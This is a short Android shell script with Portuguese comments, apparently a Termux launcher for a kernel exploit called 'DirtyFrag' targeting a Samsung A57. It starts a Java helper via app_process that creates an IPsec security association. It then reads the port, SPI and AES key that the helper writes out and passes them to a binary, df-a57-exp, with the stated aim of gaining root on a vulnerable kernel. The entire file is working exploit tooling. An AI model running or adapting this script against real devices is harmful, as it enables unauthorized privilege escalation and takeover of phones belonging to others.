#!/system/bin/sh
# =====================================================================
# DirtyFrag A57 100% Termux — sem instalar APK
# Como funciona:
#   1. app_process roda SaHelper (Java da API publica IpSecManager) e cria
#      a SA inbound no loopback (o mesmo que o app fazia)
#   2. espera sa_params.txt com encap_port/spi/aes_key
#   3. executa o exploit binario (df-a57-exp) com os mesmos args do app
#   4. marca .done pra SaHelper liberar a SA
# Requer: kernel AZI2 vulneravel (o nosso), o binario e o KO custom.
# =====================================================================
set -e
D=/data/data/com.termux/files/home/glm/CVEs/DF-A57
export CLASSPATH=$D/classes.dex
export ANDROID_DATA=/data/data/com.termux/files/usr/tmp/android-data
export ANDROID_ROOT=/system
mkdir -p $ANDROID_DATA

echo "[*] limpando runs anteriores"
rm -f $D/sa_params.txt $D/sa_params.txt.done

echo "[*] startando SaHelper (IpSecManager via app_process)..."
/system/bin/app_process64 / SaHelper $D/sa_params.txt &

echo "[*] esperando a SA (ate 20s)..."
i=0
while [ ! -f $D/sa_params.txt ] && [ $i -lt 40 ]; do
  sleep 0.5; i=$((i+1))
done
if [ ! -f $D/sa_params.txt ]; then
  echo "[!] SaHelper nao criou a SA — vendo log:"
  wait
  exit 1
fi
cat $D/sa_params.txt

ENCAP=$(grep encap_port $D/sa_params.txt | cut -d= -f2)
SPI=$(grep '^spi=' $D/sa_params.txt | cut -d= -f2)
KEY=$(grep aes_key $D/sa_params.txt | cut -d= -f2)

echo ""
echo "[*] RODANDO O EXPLOIT (stdin aberto, log abaixo)..."
$D/df-a57-exp --encap-port "$ENCAP" --sender-port 0 --spi "$SPI" --aes-key "$KEY" || true

echo "[*] liberando a SA"
touch $D/sa_params.txt.done
sleep 2
echo "[*] fim. root? adb shell / su"
